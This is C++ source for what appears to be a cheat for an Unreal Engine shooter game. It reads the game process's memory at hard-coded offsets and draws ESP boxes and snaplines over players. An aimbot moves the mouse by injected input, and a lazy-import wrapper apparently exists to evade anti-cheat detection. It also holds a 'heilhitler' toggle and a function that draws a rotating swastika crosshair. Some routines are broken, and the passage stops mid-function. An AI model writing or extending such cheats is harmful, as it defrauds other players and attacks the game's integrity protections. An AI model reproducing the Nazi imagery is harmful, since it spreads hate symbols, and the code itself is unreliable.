#include "win_utils.h"
#include "d3d9_x.h"
#include "xor.hpp"
#include <dwmapi.h>
#include <vector>
#include "skStr.h"
#include <string>
#include <iostream>
#include "skStr.h"
#include <Windows.h>
#include <string>
#include <fstream>
#include "offsets.h"
#include <cstdint>
#include <filesystem>
#include <Mmsystem.h>
#include <mciapi.h>
#include <shobjidl_core.h>
#include <direct.h>
#include <urlmon.h>
#include <random>
#include <tlhelp32.h>
#include <fstream>
#include <filesystem>
#include <Windows.h>
#include <winioctl.h>
#include <random>
#include <msxml.h>    
#include <atomic>
#include <mutex>
#include <Windows.h>
#include <TlHelp32.h>
#include <cstdint>
#include <vector>
#include <random>
#include <memoryapi.h>
#include <string>
#include <thread>
#include <chrono>
#include <iostream>
#include <string_view>
#include <mutex>
#include <chrono>
#include <TlHelp32.h>
#include <Psapi.h>
#include <tchar.h>
#include <winioctl.h>
#include <Uxtheme.h>
#include <dwmapi.h>
#include <WinInet.h>
#include <tlhelp32.h>
#include <fstream>
#include <filesystem>
#include <vector>
#include <vector>
#include <math.h>
#include <windows.h>
#include <Lmcons.h>
#include <vector>
#include <random>
#include <functional> //for std::function
#include <algorithm>  //for std::generate_n
#include "lazy.h"
#include "FVector.h"
#include "godfather.h"
ImDrawList* draw;

bool colorchanger = false;
bool DeveloperDetails = false;
bool DeveloperAdjust = false;
bool glitch = false;
bool particles = true;
bool DrawEnemyFov = false;
bool fovchanger = false;
bool killesp = false;
int fovvalue = 90;
bool Filledfov = false;
bool Rainbow = false;
bool crosshair = false;
bool skipknocked = true;
bool heilhitler = false;
bool presets = false;
bool ShowMenu = false;
bool Esp = true;
bool PlayerFly = false;
bool Esp_box = true;
bool Esp_fbox = false;
bool Esp_Distance = true;
static bool Esp_Skeleton = false;
bool nobloom = false;
static bool backround = false;
bool Esp_line = true;
static bool MouseMovementAimbot = true;
bool ProximatyCheck = true;
static bool fovCircle = false;
static bool square = false;
bool aiminair = false;
bool penis = false;
bool unicorn = false;
bool Randomizeim = false;
bool RapidFire = false;
bool AirStuck = false;
bool nominigun = false;
bool noweaponanimation = false;
bool boatfly = false;
bool playerfly = false;
bool nospread = false;
bool playerahhhbored = false;
bool InstaRes = false;
bool FOVChanger = false;
bool spinbot = false;
bool DoubleOG = false;
bool TPose = false;
bool fuel = false;
bool ThreeDBox = false;
bool vischeck = true;
bool teamcheck = false;
bool playerbot = false;
bool crossHair = false;
bool fillbox = false; 
bool reloadCheck = false;
ImFont* m_pFont;
bool RageAim = false;
static int VisDist = 500;
static int SpinBotValue = 600;
int AimFOV = 100;
int VisualDist = 100;
int FovSize = 100;
int VisualSize = 100;
float FOVChangerValue = 100;
static int aimDist = 200;

// dropdowns
static int aimkey;
static int hitbox;
static int SnaplinePosition;
static int EspPos;
static int aimkeypos = 3;
static int Esp_Pos = 0;
static int hitboxpos = 0;
static int colorpos = 0;

// hotkeysb
bool hotkeys = false;
bool Hotkey_Exit = false;
bool Hotkey_Esp = false;
bool hotkey_Reduce = false;
bool Hotkey_Findclosestpawn = false;
bool hotkey_aimat = false;

// world esp
bool worldespenabler = false;
static int WorldEspDistance = 500;
bool world_car = false;
bool world_boat = false;
bool world_weapon = false;
bool world_chests = false;
bool world_animal = false;
bool world_lama = false;
bool world_ammo = false;
bool world_supplydrop = false;
bool common{ true };
bool uncommon{ true };
bool rare{ true };
bool epic{ true };
bool legendary{ true };
bool mythic{ true };
bool world = false;

// int for Position
int WidthInt;
int HeightInt;

// Aim Aimbot methods
bool Aiming = false;
static bool AimCheck = false;
bool triggerbot = false;
bool memoryaim = false;
static int DistTriger = 800;
static int Distautoaim = 800;

// Aimbot Methods
bool SetMouse = false;
bool MouseEvent = true;
int SetMouseSpeed = 100000.0;
int MouseSwitchSpeed = 200000.0;
bool RandomizedAimbot = true;
bool RandomizeWithTime = false;
int smooth = 4;

float speedVlaue = 10;
float BoxWidthValue = 0.550;

DWORD_PTR Uworld;
DWORD_PTR LocalPawn;
DWORD_PTR PlayerState;
DWORD_PTR Localplayer;
DWORD_PTR Rootcomp;
DWORD_PTR PlayerController;
DWORD_PTR Persistentlevel;
DWORD_PTR PlayerCamManager;
Vector3 udbox;
Vector3 udboxA;
Vector3 localactorpos;
Vector3 localhitbonepos;


uint64_t TargetPawn;
int localplayerID;

RECT GameRect = { NULL };
D3DPRESENT_PARAMETERS d3dpp;

int CurrentActorId;

DWORD ScreenCenterX;
DWORD ScreenCenterY;

static void xCreateWindow();
static void xInitD3d();
void DrawESP();
static void xMainLoop();
static void xShutdown();
static LRESULT CALLBACK WinProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam);
extern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);


static HWND Window = NULL;
IDirect3D9Ex* p_Object = NULL;
static LPDIRECT3DDEVICE9 D3dDevice = NULL;
static LPDIRECT3DVERTEXBUFFER9 TriBuf = NULL;

D3DXMATRIX Matrix(Vector3 rot, Vector3 origin = Vector3(0, 0, 0))
{
	float radPitch = (rot.x * float(M_PI) / 180.f);
	float radYaw = (rot.y * float(M_PI) / 180.f);
	float radRoll = (rot.z * float(M_PI) / 180.f);

	float SP = sinf(radPitch);
	float CP = cosf(radPitch);
	float SY = sinf(radYaw);
	float CY = cosf(radYaw);
	float SR = sinf(radRoll);
	float CR = cosf(radRoll);

	D3DMATRIX matrix;
	matrix.m[0][0] = CP * CY;
	matrix.m[0][1] = CP * SY;
	matrix.m[0][2] = SP;
	matrix.m[0][3] = 0.f;

	matrix.m[1][0] = SR * SP * CY - CR * SY;
	matrix.m[1][1] = SR * SP * SY + CR * CY;
	matrix.m[1][2] = -SR * CP;
	matrix.m[1][3] = 0.f;

	matrix.m[2][0] = -(CR * SP * CY + SR * SY);
	matrix.m[2][1] = CY * SR - CR * SP * SY;
	matrix.m[2][2] = CR * CP;
	matrix.m[2][3] = 0.f;

	matrix.m[3][0] = origin.x;
	matrix.m[3][1] = origin.y;
	matrix.m[3][2] = origin.z;
	matrix.m[3][3] = 1.f;

	return matrix;
}

FTransform GetBoneIndex(uintptr_t mesh, int id)
{
	uintptr_t offset_bonearray = 0x5B8;

	DWORD_PTR bonearray = read<DWORD_PTR>(OFFSETS::Mesh + offset_bonearray);
	if (bonearray == NULL) {
		bonearray = read<DWORD_PTR>(OFFSETS::Mesh + offset_bonearray + 0x10);
	}
	FTransform bone = read<FTransform>(bonearray + (id * 0x60));

	FTransform ComponentToWorld = read<FTransform>(OFFSETS::Mesh + 0x240);

	D3DMATRIX Matrix = MatrixMultiplication(bone.ToMatrixWithScale(), ComponentToWorld.ToMatrixWithScale());
	return FTransform();

}

Vector3 GetBoneWithRotation(DWORD_PTR mesh, int id)
{
	FTransform bone = GetBoneIndex(mesh, id);
	FTransform ComponentToWorld = read<FTransform>(mesh + 0x240);

	D3DMATRIX Matrix;
	Matrix = MatrixMultiplication(bone.ToMatrixWithScale(), ComponentToWorld.ToMatrixWithScale());

	return Vector3(Matrix._41, Matrix._42, Matrix._43);
}


struct Camera
{
	float FieldOfView;
	Vector3 Rotation;
	Vector3 Location;
};

Camera GetCamera(__int64 a1)
{
	Camera FGC_Camera;
	__int64 v1;
	__int64 v6;
	__int64 v7;
	__int64 v8;

	v1 = read<__int64>(Localplayer + 0xd0);
	__int64 v9 = read<__int64>(v1 + 0x8); // 0x10

	FGC_Camera.FieldOfView = 80.f / (read<double>(v9 + 0x620) / 1.19f); // 0x600

	FGC_Camera.Rotation.x = read<double>(v9 + 0x870);
	FGC_Camera.Rotation.y = read<double>(a1 + 0x148);

	uint64_t FGC_Pointerloc = read<uint64_t>(Uworld + 0x110);
	FGC_Camera.Location = read<Vector3>(FGC_Pointerloc);

	return FGC_Camera;
}

Vector3 W2S(Vector3 WorldLocation)
{
	Camera vCamera = GetCamera(OFFSETS::RootComponet);
	vCamera.Rotation.x = (asin(vCamera.Rotation.x)) * (180.0 / M_PI);
	Vector3 Camera;

	D3DMATRIX tempMatrix = Matrix(vCamera.Rotation);

	Vector3 vAxisX = Vector3(tempMatrix.m[0][0], tempMatrix.m[0][1], tempMatrix.m[0][2]);
	Vector3 vAxisY = Vector3(tempMatrix.m[1][0], tempMatrix.m[1][1], tempMatrix.m[1][2]);
	Vector3 vAxisZ = Vector3(tempMatrix.m[2][0], tempMatrix.m[2][1], tempMatrix.m[2][2]);

	Vector3 vDelta = WorldLocation - vCamera.Location;
	Vector3 vTransformed = Vector3(vDelta.Dot(vAxisY), vDelta.Dot(vAxisZ), vDelta.Dot(vAxisX));

	if (vTransformed.z < 1.f)
		vTransformed.z = 1.f;

	//float EncryptedFOV = read<float>(addresses::playercontroller + 0x374);
	//settings::CachedFOV = EncryptedFOV * 90;
	//float FovAngle = settings::CachedFOV;

	return Vector3((Width / 2.0f) + vTransformed.x * (((Width / 2.0f) / tanf(vCamera.FieldOfView * (float)M_PI / 360.f))) / vTransformed.z, (Height / 2.0f) - vTransformed.y * (((Width / 2.0f) / tanf(vCamera.FieldOfView * (float)M_PI / 360.f))) / vTransformed.z, 0);
}

std::wstring MBytesToWString(const char* lpcszString)
{
	int len = strlen(lpcszString);
	int unicodeLen = ::MultiByteToWideChar(CP_ACP, 0, lpcszString, -1, NULL, 0);
	wchar_t* pUnicode = new wchar_t[unicodeLen + 1];
	memset(pUnicode, 0, (unicodeLen + 1) * sizeof(wchar_t));
	::MultiByteToWideChar(CP_ACP, 0, lpcszString, -1, (LPWSTR)pUnicode, unicodeLen);
	std::wstring wString = (wchar_t*)pUnicode;
	delete[] pUnicode;
	return wString;
}
std::string WStringToUTF8(const wchar_t* lpwcszWString)
{
	char* pElementText;
	int iTextLen = ::WideCharToMultiByte(CP_UTF8, 0, (LPWSTR)lpwcszWString, -1, NULL, 0, NULL, NULL);
	pElementText = new char[iTextLen + 1];
	memset((void*)pElementText, 0, (iTextLen + 1) * sizeof(char));
	::WideCharToMultiByte(CP_UTF8, 0, (LPWSTR)lpwcszWString, -1, pElementText, iTextLen, NULL, NULL);
	std::string strReturn(pElementText);
	delete[] pElementText;
	return strReturn;
}
void DrawString(float fontSize, int x, int y, RGBA* color, bool bCenter, bool stroke, const char* pText, ...)
{
	va_list va_alist;
	char buf[1024] = { 0 };
	va_start(va_alist, pText);
	_vsnprintf_s(buf, sizeof(buf), pText, va_alist);
	va_end(va_alist);
	std::string text = WStringToUTF8(MBytesToWString(buf).c_str());
	if (bCenter)
	{
		ImVec2 textSize = ImGui::CalcTextSize(text.c_str());
		x = x - textSize.x / 4;
		y = y - textSize.y;
	}
	if (stroke)
	{
		ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x + 1, y + 1), ImGui::ColorConvertFloat4ToU32(ImVec4(0, 0, 0, 1)), text.c_str());
		ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x - 1, y - 1), ImGui::ColorConvertFloat4ToU32(ImVec4(0, 0, 0, 1)), text.c_str());
		ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x + 1, y - 1), ImGui::ColorConvertFloat4ToU32(ImVec4(0, 0, 0, 1)), text.c_str());
		ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x - 1, y + 1), ImGui::ColorConvertFloat4ToU32(ImVec4(0, 0, 0, 1)), text.c_str());
	}
	ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x, y), ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 153.0, color->B / 51.0, color->A / 255.0)), text.c_str());
}
char* wchar_to_char(const wchar_t* pwchar)
{
	int currentCharIndex = 0;
	char currentChar = pwchar[currentCharIndex];

	while (currentChar != '\0')
	{
		currentCharIndex++;
		currentChar = pwchar[currentCharIndex];
	}

	const int charCount = currentCharIndex + 1;

	char* filePathC = (char*)malloc(sizeof(char) * charCount);

	for (int i = 0; i < charCount; i++)
	{
		char character = pwchar[i];

		*filePathC = character;

		filePathC += sizeof(char);

	}
	filePathC += '\0';

	filePathC -= (sizeof(char) * charCount);

	return filePathC;
}
float DrawOutlinedText(ImFont* pFont, const std::string& text, const ImVec2& pos, float size, ImU32 color, bool center)
{
	std::stringstream stream(text);
	std::string line;

	float y = 0.0f;
	int i = 0;

	while (std::getline(stream, line))
	{
		ImVec2 textSize = pFont->CalcTextSizeA(size, FLT_MAX, 0.0f, line.c_str());

		if (center)
		{
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x - textSize.x / 2.0f) + 1, (pos.y + textSize.y * i) + 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x - textSize.x / 2.0f) - 1, (pos.y + textSize.y * i) - 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x - textSize.x / 2.0f) + 1, (pos.y + textSize.y * i) - 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x - textSize.x / 2.0f) - 1, (pos.y + textSize.y * i) + 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());

			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2(pos.x - textSize.x / 2.0f, pos.y + textSize.y * i), ImGui::GetColorU32(color), line.c_str());
		}
		else
		{
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x) + 1, (pos.y + textSize.y * i) + 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x) - 1, (pos.y + textSize.y * i) - 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x) + 1, (pos.y + textSize.y * i) - 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x) - 1, (pos.y + textSize.y * i) + 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());

			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2(pos.x, pos.y + textSize.y * i), ImGui::GetColorU32(color), line.c_str());
		}

		y = pos.y + textSize.y * (i + 1);
		i++;
	}
	return y;
}

void DrawText1(int x, int y, const char* str, RGBA* color)
{
	ImFont a;
	std::string utf_8_1 = std::string(str);
	std::string utf_8_2 = string_To_UTF8(utf_8_1);
	ImGui::GetOverlayDrawList()->AddText(ImVec2(x, y), ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 255.0, color->B / 255.0, color->A / 255.0)), utf_8_2.c_str());
}

void DrawLine(int x1, int y1, int x2, int y2, RGBA* color, int thickness)
{
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(x1, y1), ImVec2(x2, y2), ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 255.0, color->B / 255.0, color->A / 255.0)), thickness);
}

void DrawCircle(int x, int y, int radius, RGBA* color, int segments, float thickness)
{
	ImGui::GetOverlayDrawList()->AddCircle(ImVec2(x, y), radius, ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 255.0, color->B / 255.0, color->A / 255.0)), segments, thickness);
}

void DrawCorneredBox(int X, int Y, int W, int H, ImU32 color, int thickness) {

	float lineW = (W / 3);
	float lineH = (H / 3);

	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X, Y + lineH), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X + lineW, Y), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y), ImVec2(X + W, Y), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y), ImVec2(X + W, Y + lineH), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H - lineH), ImVec2(X, Y + H), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H), ImVec2(X + lineW, Y + H), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y + H), ImVec2(X + W, Y + H), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y + H - lineH), ImVec2(X + W, Y + H), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);


	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X, Y + lineH), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X + lineW, Y), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y), ImVec2(X + W, Y), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y), ImVec2(X + W, Y + lineH), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H - lineH), ImVec2(X, Y + H), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H), ImVec2(X + lineW, Y + H), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y + H), ImVec2(X + W, Y + H), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y + H - lineH), ImVec2(X + W, Y + H), ImGui::GetColorU32(color), thickness);
}

void DrawCrossHair()
{
	ImGui::GetOverlayDrawList()->AddCircleFilled(ImVec2(Width, Height), 5, ImColor(255, 255, 255, 255));
}

void DrawFilledRect(int x, int y, int w, int h, RGBA* color)
{
	ImGui::GetOverlayDrawList()->AddRectFilled(ImVec2(x, y), ImVec2(x + w, y + h), ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 255.0, color->B / 255.0, color->A / 255.0)), 0, 0);
}

static std::string ReadGetNameFromFName(int key) {
	uint32_t ChunkOffset = (uint32_t)((int)(key) >> 16);
	uint16_t NameOffset = (uint16_t)key;

	uint64_t NamePoolChunk = read<uint64_t>(base_address + 0xE0F8C00 + (8 * ChunkOffset) + 16) + (unsigned int)(4 * NameOffset);
	uint16_t nameEntry = read<uint16_t>(NamePoolChunk);

	int nameLength = nameEntry >> 6;
	char buff[1024];
	if ((uint32_t)nameLength)
	{
		for (int x = 0; x < nameLength; ++x)
		{
			buff[x] = read<char>(NamePoolChunk + 4 + x);
		}

		char* v2 = buff; // rdi 
		__int64 result; // rax 
		unsigned int v5 = nameLength; // ecx 
		__int64 v6; // r8 
		char v7; // cl 
		unsigned int v8; // eax 

		result = 22i64;
		if (v5)
		{
			v6 = v5;
			do
			{
				v7 = *v2++;
				v8 = result + 45297;
				*(v2 - 1) = v8 + ~v7;
				result = (v8 << 8) | (v8 >> 8);
				--v6;
			} while (v6);
		}

		buff[nameLength] = '\0';
		return std::string(buff);
	}
	else {
		return "";
	}
}

static std::string GetNameFromFName(int key)
{
	uint32_t ChunkOffset = (uint32_t)((int)(key) >> 16);
	uint16_t NameOffset = (uint16_t)key;

	uint64_t NamePoolChunk = read<uint64_t>(base_address + 0xE0F8C00 + (8 * ChunkOffset) + 16) + (unsigned int)(4 * NameOffset); //((ChunkOffset + 2) * 8) ERROR_NAME_SIZE_EXCEEDED
	if (read<uint16_t>(NamePoolChunk) < 64)
	{
		auto a1 = read<DWORD>(NamePoolChunk + 4);
		return ReadGetNameFromFName(a1);
	}
	else
	{
		return ReadGetNameFromFName(key);
	}
}

void DrawFilledV2(int x, int y, int w, int h, ImU32 color)
{
	ImGui::GetOverlayDrawList()->AddRectFilled(ImVec2(x, y), ImVec2(x + w, y + h), color, 0, 0);
}

void DrawBox(int x, int y, int w, int h, int borderPx, ImU32 color)
{
	ImU32 Color;
	Color = ImGui::GetColorU32({ 255, 0, 0, 255 });

	DrawFilledV2(x + borderPx, y, w, borderPx, color); //top 
	DrawFilledV2(x + w - w + borderPx, y, w, borderPx, color); //top 
	DrawFilledV2(x, y, borderPx, h, color); //left 
	DrawFilledV2(x, y + h - h + borderPx * 2, borderPx, h, color); //left 
	DrawFilledV2(x + borderPx, y + h + borderPx, w, borderPx, color); //bottom 
	DrawFilledV2(x + w - w + borderPx, y + h + borderPx, w, borderPx, color); //bottom 
	DrawFilledV2(x + w + borderPx, y, borderPx, h, color);//right 
	DrawFilledV2(x + w + borderPx, y + h - h + borderPx * 2, borderPx, h, color);//right 
	DrawFilledV2(x, y, borderPx, 1.5, Color); //left 
}

void DrawLeftProgressBar(int x, int y, int w, int h, int thick, int m_health)
{
	int G = (255 * m_health / 100);
	int R = 255 - G;
	RGBA healthcol = { R, G, 0, 255 };

	DrawFilledRect(x - (w / 2) - 3, y, thick, (h)*m_health / 100, &healthcol);
}
void DrawRightProgressBar(int x, int y, int w, int h, int thick, int m_health)
{
	int G = (255 * m_health / 100);
	int R = 255 - G;
	RGBA healthcol = { R, G, 0, 255 };

	DrawFilledRect(x + (w / 2) - 25, y, thick, (h)*m_health / 100, &healthcol);
}

typedef struct _FNlEntity
{
	uint64_t Actor;
	int ID;
	uint64_t mesh;
}FNlEntity;
std::vector<FNlEntity> entityList;

typedef struct _LootEntity {
	std::string GNames;
	uintptr_t ACurrentItem;
}LootEntity;
static std::vector<LootEntity> LootentityList;

std::uintptr_t process_find(const std::string& name)
{
	const auto snap = LI_FN(CreateToolhelp32Snapshot).safe()(TH32CS_SNAPPROCESS, 0);
	if (snap == INVALID_HANDLE_VALUE) {
		return 0;
	}

	PROCESSENTRY32 proc_entry{};
	proc_entry.dwSize = sizeof proc_entry;

	auto found_process = false;
	if (!!LI_FN(Process32First).safe()(snap, &proc_entry)) {
		do {
			if (name == proc_entry.szExeFile) {
				found_process = true;
				break;
			}
		} while (!!LI_FN(Process32Next).safe()(snap, &proc_entry));
	}

	LI_FN(CloseHandle).safe()(snap);
	return found_process
		? proc_entry.th32ProcessID
		: 0;
}

using namespace std;

float BOG_TO_GRD(float BOG) {
	return (180 / M_PI) * BOG;
}

float GRD_TO_BOG(float GRD) {
	return (M_PI / 180) * GRD;
}

int faken_rot = 0;

void DrawCrossNazi(int buyukluk, DWORD color)
{
	POINT Screen; int oodofdfo, jbjfdbdsf;
	Screen.x = GetSystemMetrics(0);
	Screen.y = GetSystemMetrics(1);
	//Middle POINT
	POINT Middle; Middle.x = (int)(Screen.x / 2); Middle.y = (int)(Screen.y / 2);
	int a = (int)(Screen.y / 2 / 30);
	float gamma = atan(a / a);
	faken_rot++;
	int Drehungswinkel = faken_rot;

	int i = 0;
	while (i < 4)
	{
		std::vector <int> p;
		p.push_back(a * sin(GRD_TO_BOG(Drehungswinkel + (i * 90))));									//p[0]		p0_A.x
		p.push_back(a * cos(GRD_TO_BOG(Drehungswinkel + (i * 90))));									//p[1]		p0_A.y
		p.push_back((a / cos(gamma)) * sin(GRD_TO_BOG(Drehungswinkel + (i * 90) + BOG_TO_GRD(gamma))));	//p[2]		p0_B.x
		p.push_back((a / cos(gamma)) * cos(GRD_TO_BOG(Drehungswinkel + (i * 90) + BOG_TO_GRD(gamma))));	//p[3]		p0_B.y

		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Middle.x, Middle.y), ImVec2(Middle.x + p[0], Middle.y - p[1]), ImColor(255, 0, 0, 255));
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Middle.x + p[0], Middle.y - p[1]), ImVec2(Middle.x + p[2], Middle.y - p[3]), ImColor(255, 0, 0, 255));

		i++;
	}
}

void SetWindowToTarget()
{
	while (true)
	{
		if (hwnd)
		{
			ZeroMemory(&GameRect, sizeof(GameRect));
			GetWindowRect(hwnd, &GameRect);
			Width = GameRect.right - GameRect.left;
			Height = GameRect.bottom - GameRect.top;
			DWORD dwStyle = GetWindowLong(hwnd, GWL_STYLE);

			if (dwStyle & WS_BORDER)
			{
				GameRect.top += 32;
				Height -= 39;
			}
			ScreenCenterX = Width / 2;
			ScreenCenterY = Height / 2;
			MoveWindow(Window, GameRect.left, GameRect.top, Width, Height, true);
		}
		else
		{
			exit(0);
		}
	}
}

const MARGINS Margin = { -1 };


void AimbotRandomizer(int Time, int WTime)
{
	if (RandomizedAimbot) {
		auto Start = std::chrono::high_resolution_clock::now();

		while (1)
		{
			if (RandomizeWithTime == true) {
				auto End = std::chrono::high_resolution_clock::now();
				std::chrono::duration<double, std::milli> Elapsed = End - Start;
				if (Elapsed.count() >= Time) {
					MouseEvent = false;
					SetMouse = true;
				}
				else if (Elapsed.count() >= WTime)
				{
					MouseEvent = true;
					SetMouse = false;
				}
			}
			else if (RandomizeWithTime == false) {
				auto End = std::chrono::high_resolution_clock::now();
				std::chrono::duration<double, std::milli> Elapsed = End - Start;
				if (Elapsed.count() >= Time) {
					MouseEvent = false;
					SetMouse = true;
				}
				else if (Elapsed.count() >= WTime)
				{
					MouseEvent = true;
					SetMouse = false;
				}
			}

			break;
		}
	}

	return;
}

void SetMouseAbsPosition(DWORD x, DWORD y)
{
	INPUT input = { 0 };
	input.type = INPUT_MOUSE;
	input.mi.dwFlags = MOUSEEVENTF_MOVE;
	input.mi.dx = x;
	input.mi.dy = y;
	SendInput(1, &input, sizeof(input));
}

void aimbot(float x, float y)
{
	float ScreenCenterX = (Width / 2);
	float ScreenCenterY = (Height / 2);
	int AimSpeed = smooth;
	float TargetX = 0;
	float TargetY = 0;

	if (x != 0)
	{
		if (x > ScreenCenterX)
		{
			TargetX = -(ScreenCenterX - x);
			TargetX /= AimSpeed;
			if (TargetX + ScreenCenterX > ScreenCenterX * 2) TargetX = 0;
		}

		if (x < ScreenCenterX)
		{
			TargetX = x - ScreenCenterX;
			TargetX /= AimSpeed;
			if (TargetX + ScreenCenterX < 0) TargetX = 0;
		}
	}

	if (y != 0)
	{
		if (y > ScreenCenterY)
		{
			TargetY = -(ScreenCenterY - y);
			TargetY /= AimSpeed;
			if (TargetY + ScreenCenterY > ScreenCenterY * 2) TargetY = 0;
		}

		if (y < ScreenCenterY)
		{
			TargetY = y - ScreenCenterY;
			TargetY /= AimSpeed;
			if (TargetY + ScreenCenterY < 0) TargetY = 0;
		}
	}

	if (MouseEvent) { mouse_event(MOUSEEVENTF_MOVE, static_cast<DWORD>(TargetX), static_cast<DWORD>(TargetY), NULL, NULL); }
	else if (SetMouse) { SetMouseAbsPosition(TargetX, TargetY); }

	return;
}


bool once = false;
namespace Framework {
	namespace Structs {


		struct FMatrix
		{
			float M[4][4];
		};
		static FMatrix* myMatrix = new FMatrix();


		template<class T>
		struct TArray
		{
			friend struct FString;

		public:
			inline TArray()
			{
				Data = nullptr;
				Count = Max = 0;
			};

			inline int Num() const
			{
				return Count;
			};

			inline T& operator[](int i)
			{
				return Data[i];
			};

			inline const T& operator[](int i) const
			{
				return Data[i];
			};

			inline bool IsValidIndex(int i) const
			{
				return i < Num();
			}

		private:
			T* Data;
			int32_t Count;
			int32_t Max;
		};

		struct FString : private TArray<wchar_t>
		{
			inline FString()
			{
			};

			FString(const wchar_t* other)
			{
				Max = Count = *other ? std::wcslen(other) + 1 : 0;

				if (Count)
				{
					Data = const_cast<wchar_t*>(other);
				}
			};

			inline bool IsValid() const
			{
				return Data != nullptr;
			}

			inline const wchar_t* c_str() const
			{
				return Data;
			}

			std::string ToString() const
			{
				auto length = std::wcslen(Data);
				std::string str(length, '\0');
				std::use_facet<std::ctype<wchar_t>>(std::locale()).narrow(Data, Data + length, '?', &str[0]);
				return str;
			}
		};
	}

}
#define ReadPointer(base, offset) (*(PVOID *)(((PBYTE)base + offset)))
VOID ToMatrixWithScale(float* in, float out[4][4]);
VOID GetBoneLocation(float compMatrix[4][4], PVOID bones, DWORD index, float out[3]);

VOID ToMatrixWithScale(float* in, float out[4][4]) {
	auto* rotation = &in[0];
	auto* translation = &in[4];
	auto* scale = &in[8];

	out[3][0] = translation[0];
	out[3][1] = translation[1];
	out[3][2] = translation[2];

	auto x2 = rotation[0] + rotation[0];
	auto y2 = rotation[1] + rotation[1];
	auto z2 = rotation[2] + rotation[2];

	auto xx2 = rotation[0] * x2;
	auto yy2 = rotation[1] * y2;
	auto zz2 = rotation[2] * z2;
	out[0][0] = (1.0f - (yy2 + zz2)) * scale[0];
	out[1][1] = (1.0f - (xx2 + zz2)) * scale[1];
	out[2][2] = (1.0f - (xx2 + yy2)) * scale[2];

	auto yz2 = rotation[1] * z2;
	auto wx2 = rotation[3] * x2;
	out[2][1] = (yz2 - wx2) * scale[2];
	out[1][2] = (yz2 + wx2) * scale[1];

	auto xy2 = rotation[0] * y2;
